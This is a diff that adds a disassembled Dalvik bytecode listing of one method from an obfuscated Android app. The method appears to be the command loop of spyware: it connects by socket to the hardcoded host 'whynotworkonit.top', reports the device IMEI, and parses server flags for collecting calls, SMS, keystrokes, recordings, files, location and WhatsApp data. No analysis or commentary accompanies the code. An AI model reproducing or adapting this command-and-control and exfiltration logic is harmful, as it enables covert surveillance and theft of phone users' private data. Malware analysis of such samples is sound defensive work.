@@ -1,0 +1,1804 @@
+# Lcom/mixio/tosh/aprl/aetn/ate$b;->run()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v31
+#
+# - return:void
+
+run-BB@0x0 : [ run-BB@0x34 ]
+	0       (00000000) move-object/from16   v7, v31
+	1       (00000004) const-string         v8, 'UPLOAD'
+	2       (00000008) const-string         v9, ':'
+	3       (0000000c) const-string         v10, ' '
+	4       (00000010) const-string         v11, 'busk'
+	5       (00000014) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->m Ljava/lang/String;
+	6       (00000018) invoke-virtual       v7, v1, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String;)Ljava/lang/String;
+	7       (0000001e) move-result-object   v1
+	8       (00000020) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->m Ljava/lang/String;
+	9       (00000024) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->n Ljava/lang/String;
+	10      (00000028) invoke-virtual       v7, v1, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String;)Ljava/lang/String;
+	11      (0000002e) move-result-object   v1
+	12      (00000030) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->n Ljava/lang/String;
+
+run-BB@0x34 : [ run-BB@0x3c run-BB@0x122e ]
+	13      (00000034) sget-boolean         v1, Lcom/mixio/tosh/aprl/aetn/ate;->d Z
+	14      (00000038) if-eqz               v1, +8fb
+
+run-BB@0x3c : [ run-BB@0x54 ]
+	15      (0000003c) const-string         v12, 'resolve host'
+	16      (00000040) const-string         v13, 'failed to connect'
+	17      (00000044) const-string         v14, 'Skip:'
+	18      (00000048) const-string         v15, 'rcount'
+	19      (0000004c) const-wide/32        v16, 120000 # [120000.0]
+	20      (00000052) const/4              v6, 0
+
+run-BB@0x54 : [ run-BB@0x134 ]
+	21      (00000054) iget-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	22      (00000058) invoke-virtual       v1, Lcom/mixio/tosh/aprl/aetn/ate;->b()V
+	23      (0000005e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	24      (00000062) const/4              v2, 5
+	25      (00000064) invoke-interface     v1, v15, v2, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	26      (0000006a) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	27      (0000006e) const-string         v3, '1.2'
+	28      (00000072) invoke-interface     v1, v11, v3, Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+	29      (00000078) move-result-object   v1
+	30      (0000007a) sput-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->a Ljava/lang/String;
+	31      (0000007e) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	32      (00000082) const-string         v3, 'pobusk'
+	33      (00000086) const                v4, 48765 # [6.83343196127997e-41]
+	34      (0000008c) invoke-interface     v1, v3, v4, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	35      (00000092) move-result          v1
+	36      (00000094) invoke-static        v1, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
+	37      (0000009a) move-result-object   v1
+	38      (0000009c) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->l Ljava/lang/Integer;
+	39      (000000a0) new-instance         v1, Ljava/lang/StringBuilder;
+	40      (000000a4) invoke-direct        v1, Ljava/lang/StringBuilder;-><init>()V
+	41      (000000aa) sget-object          v3, Lcom/mixio/tosh/aprl/aetn/ate;->a Ljava/lang/String;
+	42      (000000ae) invoke-virtual       v1, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	43      (000000b4) invoke-virtual       v1, v10, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	44      (000000ba) iget-object          v3, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->l Ljava/lang/Integer;
+	45      (000000be) invoke-static        v3, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+	46      (000000c4) move-result-object   v3
+	47      (000000c6) invoke-virtual       v1, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	48      (000000cc) invoke-virtual       v1, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	49      (000000d2) const-string         v1, 'whynotworkonit.top'
+	50      (000000d6) sput-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->a Ljava/lang/String;
+	51      (000000da) sget-object          v1, Lb/c/a/a/a;->a Ljava/lang/Integer;
+	52      (000000de) iput-object          v1, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->l Ljava/lang/Integer;
+	53      (000000e2) new-instance         v4, Ljava/net/Socket;
+	54      (000000e6) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->a Ljava/lang/String;
+	55      (000000ea) invoke-static        v1, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;
+	56      (000000f0) move-result-object   v1
+	57      (000000f2) iget-object          v3, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->l Ljava/lang/Integer;
+	58      (000000f6) invoke-virtual       v3, Ljava/lang/Integer;->intValue()I
+	59      (000000fc) move-result          v3
+	60      (000000fe) invoke-direct        v4, v1, v3, Ljava/net/Socket;-><init>(Ljava/net/InetAddress; I)V
+	61      (00000104) const                v1, 120000 # [1.6815581571897805e-40]
+	62      (0000010a) invoke-virtual       v4, v1, Ljava/net/Socket;->setSoTimeout(I)V
+	63      (00000110) new-instance         v3, Ljava/io/DataInputStream;
+	64      (00000114) invoke-virtual       v4, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
+	65      (0000011a) move-result-object   v1
+	66      (0000011c) invoke-direct        v3, v1, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
+	67      (00000122) new-instance         v1, Ljava/io/DataOutputStream;
+	68      (00000126) invoke-virtual       v4, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
+	69      (0000012c) move-result-object   v2
+	70      (0000012e) invoke-direct        v1, v2, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
+	54:133
+	(Ljava/lang/Exception; -> 1084 run-BB@0x1084)
+
+run-BB@0x134 : [ run-BB@0x19a ]
+	71      (00000134) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	72      (00000138) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->a Ljava/lang/String;
+	73      (0000013c) invoke-interface     v2, v11, v5, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+	74      (00000142) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	75      (00000146) invoke-interface     v2, v15, v6, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String; I)Landroid/content/SharedPreferences$Editor;
+	76      (0000014c) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->f Landroid/content/SharedPreferences$Editor;
+	77      (00000150) invoke-interface     v2, Landroid/content/SharedPreferences$Editor;->commit()Z
+	78      (00000156) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	79      (0000015a) invoke-interface     v2, v15, v6, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	80      (00000160) move-result          v2
+	81      (00000162) invoke-static        v2, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+	82      (00000168) const/4              v5, 0
+	83      (0000016a) iput-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	84      (0000016e) invoke-virtual       v3, Ljava/io/DataInputStream;->readInt()I
+	85      (00000174) move-result          v2
+	86      (00000176) new-array            v2, v2, [B
+	87      (0000017a) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	88      (0000017e) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	89      (00000182) invoke-virtual       v3, v2, Ljava/io/DataInputStream;->read([B)I
+	90      (00000188) move-result          v2
+	91      (0000018a) iput                 v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	92      (0000018e) new-instance         v2, Ljava/lang/String;
+	93      (00000192) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	94      (00000196) move-object/from16   v21, v4
+	134:195
+	(Ljava/lang/Exception; -> f98 run-BB@0xf98)
+
+run-BB@0x19a : [ run-BB@0x260 run-BB@0xf58 ]
+	95      (0000019a) iget                 v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	96      (0000019e) invoke-direct        v2, v5, v6, v4, Ljava/lang/String;-><init>([B I I)V
+	97      (000001a4) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	98      (000001a8) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	99      (000001ac) new-instance         v2, Ljava/lang/StringBuilder;
+	100     (000001b0) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	101     (000001b6) invoke-virtual/range v31, Lcom/mixio/tosh/aprl/aetn/ate$b;->b()Ljava/lang/String;
+	102     (000001bc) move-result-object   v4
+	103     (000001be) invoke-virtual       v2, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	104     (000001c4) invoke-virtual       v2, v9, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	105     (000001ca) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->p Lcom/mixio/tosh/aprl/aetn/ate;
+	106     (000001ce) invoke-virtual       v4, Lcom/mixio/tosh/aprl/aetn/ate;->f()Ljava/lang/String;
+	107     (000001d4) move-result-object   v4
+	108     (000001d6) invoke-virtual       v2, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	109     (000001dc) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	110     (000001e2) move-result-object   v2
+	111     (000001e4) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	112     (000001e8) const/4              v5, 0
+	113     (000001ea) iput-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	114     (000001ee) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	115     (000001f2) invoke-virtual       v7, v2, Lcom/mixio/tosh/aprl/aetn/ate$b;->d(Ljava/lang/String;)Ljava/lang/String;
+	116     (000001f8) move-result-object   v2
+	117     (000001fa) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	118     (000001fe) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	119     (00000202) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	120     (00000206) invoke-virtual       v2, Ljava/lang/String;->getBytes()[B
+	121     (0000020c) move-result-object   v2
+	122     (0000020e) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	123     (00000212) new-instance         v2, Ljava/lang/StringBuilder;
+	124     (00000216) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	125     (0000021c) const-string         v4, 'L:'
+	126     (00000220) invoke-virtual       v2, v4, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	127     (00000226) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	128     (0000022a) array-length         v4, v4
+	129     (0000022c) invoke-virtual       v2, v4, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+	130     (00000232) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	131     (00000238) move-result-object   v2
+	132     (0000023a) invoke-static        v2, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+	133     (00000240) move-result-object   v2
+	134     (00000242) invoke-virtual       v2, Ljava/lang/String;->getBytes()[B
+	135     (00000248) move-result-object   v2
+	136     (0000024a) invoke-virtual       v1, v2, Ljava/io/DataOutputStream;->write([B)V
+	137     (00000250) const-string         v2, 'IMEI'
+	138     (00000254) invoke-virtual       v7, v3, v2, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	139     (0000025a) move-result          v2
+	140     (0000025c) if-eqz               v2, +67e
+	19a:2a5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x260 : [ run-BB@0x274 run-BB@0xf58 ]
+	141     (00000260) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	142     (00000264) const-string         v4, 'OK'
+	143     (00000268) invoke-virtual       v2, v4, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I
+	144     (0000026e) move-result          v2
+	145     (00000270) if-nez               v2, +674
+	19a:2a5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x274 : [ run-BB@0x292 ]
+	146     (00000274) new-instance         v2, Ljava/io/ByteArrayInputStream;
+	147     (00000278) iget-object          v4, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->d [B
+	148     (0000027c) invoke-direct        v2, v4, Ljava/io/ByteArrayInputStream;-><init>([B)V
+	149     (00000282) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->i Ljava/io/ByteArrayInputStream;
+	150     (00000286) const/16             v4, 512
+	151     (0000028a) new-array            v2, v4, [B
+	152     (0000028e) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	19a:2a5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x292 : [ run-BB@0x2ac run-BB@0x2c6 ]
+	153     (00000292) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->i Ljava/io/ByteArrayInputStream;
+	154     (00000296) iget-object          v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	155     (0000029a) invoke-virtual       v2, v5, v6, v4, Ljava/io/ByteArrayInputStream;->read([B I I)I
+	156     (000002a0) move-result          v2
+	157     (000002a2) iput                 v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	158     (000002a6) const/4              v5, -1
+	159     (000002a8) if-eq                v2, v5, +f
+
+run-BB@0x2ac : [ run-BB@0x292 ]
+	160     (000002ac) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->b [B
+	161     (000002b0) iget                 v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	162     (000002b4) invoke-virtual       v1, v2, v6, v5, Ljava/io/DataOutputStream;->write([B I I)V
+	163     (000002ba) const/4              v5, 0
+	164     (000002bc) goto                 -15
+	2ac:2b9
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x2be : [ run-BB@0x58a ]
+	165     (000002be) move-exception       v0
+	166     (000002c0) move-object          v1, v0
+	167     (000002c2) goto/16              +164
+
+run-BB@0x2c6 : [ run-BB@0x2d6 run-BB@0xf58 ]
+	168     (000002c6) const-string         v2, 'Flags'
+	169     (000002ca) invoke-virtual       v7, v3, v2, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/io/DataInputStream; Ljava/lang/String;)Z
+	170     (000002d0) move-result          v2
+	171     (000002d2) if-eqz               v2, +643
+	2c6:2f5
+	(Ljava/lang/Exception; -> f7c run-BB@0xf7c)
+
+run-BB@0x2d6 : [ run-BB@0x304 run-BB@0x54a ]
+	172     (000002d6) iput                 v5, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->c I
+	173     (000002da) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	174     (000002de) invoke-virtual       v7, v2, Lcom/mixio/tosh/aprl/aetn/ate$b;->c(Ljava/lang/String;)Ljava/lang/String;
+	175     (000002e4) move-result-object   v2
+	176     (000002e6) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	177     (000002ea) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	178     (000002ee) invoke-virtual       v2, Ljava/lang/String;->length()I
+	179     (000002f4) move-result          v2
+	180     (000002f6) const/16             v22, 3
+	181     (000002fa) const/16             v23, 2
+	182     (000002fe) const/4              v6, 4
+	183     (00000300) if-lez               v2, +125
+
+run-BB@0x304 : [ run-BB@0x326 run-BB@0x54a ]
+	184     (00000304) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->e Ljava/lang/String;
+	185     (00000308) const-string         v4, '/'
+	186     (0000030c) invoke-virtual       v2, v4, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+	187     (00000312) move-result-object   v2
+	188     (00000314) iput-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	189     (00000318) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	190     (0000031c) array-length         v2, v2
+	191     (0000031e) const/16             v4, 16
+	192     (00000322) if-ne                v2, v4, +114
+	304:549
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
+run-BB@0x326 : [ run-BB@0x54a ]
+	193     (00000326) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	194     (0000032a) const/4              v4, 0
+	195     (0000032c) aget-object          v2, v2, v4
+	196     (00000330) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	197     (00000336) move-result-object   v2
+	198     (00000338) const-string         v4, 'Call'
+	199     (0000033c) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	200     (00000340) iget-object          v5, v5, Lb/b/a/a/g/a;->a Lb/b/a/a/g/b;
+	201     (00000344) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	202     (0000034a) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	203     (0000034e) const/4              v4, 1
+	204     (00000350) aget-object          v2, v2, v4
+	205     (00000354) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	206     (0000035a) move-result-object   v2
+	207     (0000035c) const-string         v4, 'CT'
+	208     (00000360) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	209     (00000364) iget-object          v5, v5, Lb/b/a/a/g/a;->b Lb/b/a/a/g/b;
+	210     (00000368) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	211     (0000036e) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	212     (00000372) aget-object          v2, v2, v23
+	213     (00000376) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	214     (0000037c) move-result-object   v2
+	215     (0000037e) const-string         v4, 'SMS'
+	216     (00000382) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	217     (00000386) iget-object          v5, v5, Lb/b/a/a/g/a;->c Lb/b/a/a/g/b;
+	218     (0000038a) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	219     (00000390) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	220     (00000394) aget-object          v2, v2, v22
+	221     (00000398) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	222     (0000039e) move-result-object   v2
+	223     (000003a0) const-string         v4, 'Key'
+	224     (000003a4) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	225     (000003a8) iget-object          v5, v5, Lb/b/a/a/g/a;->d Lb/b/a/a/g/b;
+	226     (000003ac) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	227     (000003b2) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	228     (000003b6) aget-object          v2, v2, v6
+	229     (000003ba) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	230     (000003c0) move-result-object   v2
+	231     (000003c2) const-string         v4, 'Tree'
+	232     (000003c6) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	233     (000003ca) iget-object          v5, v5, Lb/b/a/a/g/a;->e Lb/b/a/a/g/b;
+	234     (000003ce) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	235     (000003d4) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	236     (000003d8) const/4              v4, 5
+	237     (000003da) aget-object          v2, v2, v4
+	238     (000003de) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	239     (000003e4) move-result-object   v2
+	240     (000003e6) const-string         v4, 'AC'
+	241     (000003ea) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	242     (000003ee) iget-object          v5, v5, Lb/b/a/a/g/a;->f Lb/b/a/a/g/b;
+	243     (000003f2) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	244     (000003f8) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	245     (000003fc) const/4              v4, 6
+	246     (000003fe) aget-object          v2, v2, v4
+	247     (00000402) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	248     (00000408) move-result-object   v2
+	249     (0000040a) const-string         v4, 'Net'
+	250     (0000040e) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	251     (00000412) iget-object          v5, v5, Lb/b/a/a/g/a;->g Lb/b/a/a/g/b;
+	252     (00000416) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	253     (0000041c) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	254     (00000420) const/4              v4, 7
+	255     (00000422) aget-object          v2, v2, v4
+	256     (00000426) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	257     (0000042c) move-result-object   v2
+	258     (0000042e) const-string         v4, 'CR'
+	259     (00000432) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	260     (00000436) iget-object          v5, v5, Lb/b/a/a/g/a;->h Lb/b/a/a/g/b;
+	261     (0000043a) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	262     (00000440) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	263     (00000444) const/16             v4, 8
+	264     (00000448) aget-object          v2, v2, v4
+	265     (0000044c) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	266     (00000452) move-result-object   v2
+	267     (00000454) const-string         v4, 'LR'
+	268     (00000458) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	269     (0000045c) iget-object          v5, v5, Lb/b/a/a/g/a;->i Lb/b/a/a/g/b;
+	270     (00000460) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	271     (00000466) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	272     (0000046a) const/16             v4, 9
+	273     (0000046e) aget-object          v2, v2, v4
+	274     (00000472) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	275     (00000478) move-result-object   v2
+	276     (0000047a) const-string         v4, 'FS'
+	277     (0000047e) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	278     (00000482) iget-object          v5, v5, Lb/b/a/a/g/a;->j Lb/b/a/a/g/b;
+	279     (00000486) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	280     (0000048c) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	281     (00000490) const/16             v4, 10
+	282     (00000494) aget-object          v2, v2, v4
+	283     (00000498) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	284     (0000049e) move-result-object   v2
+	285     (000004a0) const-string         v4, 'GP'
+	286     (000004a4) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	287     (000004a8) iget-object          v5, v5, Lb/b/a/a/g/a;->k Lb/b/a/a/g/b;
+	288     (000004ac) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	289     (000004b2) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	290     (000004b6) const/16             v4, 11
+	291     (000004ba) aget-object          v2, v2, v4
+	292     (000004be) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	293     (000004c4) move-result-object   v2
+	294     (000004c6) const-string         v4, 'PK'
+	295     (000004ca) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	296     (000004ce) iget-object          v5, v5, Lb/b/a/a/g/a;->l Lb/b/a/a/g/b;
+	297     (000004d2) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	298     (000004d8) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	299     (000004dc) const/16             v4, 12
+	300     (000004e0) aget-object          v2, v2, v4
+	301     (000004e4) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	302     (000004ea) move-result-object   v2
+	303     (000004ec) const-string         v4, 'BW'
+	304     (000004f0) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	305     (000004f4) iget-object          v5, v5, Lb/b/a/a/g/a;->m Lb/b/a/a/g/b;
+	306     (000004f8) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	307     (000004fe) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	308     (00000502) const/16             v4, 13
+	309     (00000506) aget-object          v2, v2, v4
+	310     (0000050a) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	311     (00000510) move-result-object   v2
+	312     (00000512) const-string         v4, 'CE'
+	313     (00000516) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	314     (0000051a) iget-object          v5, v5, Lb/b/a/a/g/a;->n Lb/b/a/a/g/b;
+	315     (0000051e) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	316     (00000524) iget-object          v2, v7, Lcom/mixio/tosh/aprl/aetn/ate$b;->g [Ljava/lang/String;
+	317     (00000528) const/16             v4, 14
+	318     (0000052c) aget-object          v2, v2, v4
+	319     (00000530) invoke-virtual       v2, Ljava/lang/String;->trim()Ljava/lang/String;
+	320     (00000536) move-result-object   v2
+	321     (00000538) const-string         v4, 'Wapp'
+	322     (0000053c) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->j Lb/b/a/a/g/a;
+	323     (00000540) iget-object          v5, v5, Lb/b/a/a/g/a;->o Lb/b/a/a/g/b;
+	324     (00000544) invoke-virtual       v7, v2, v4, v5, Lcom/mixio/tosh/aprl/aetn/ate$b;->a(Ljava/lang/String; Ljava/lang/String; Lb/b/a/a/g/b;)Z
+	304:549
+	(Ljava/lang/Exception; -> 2be run-BB@0x2be)
+
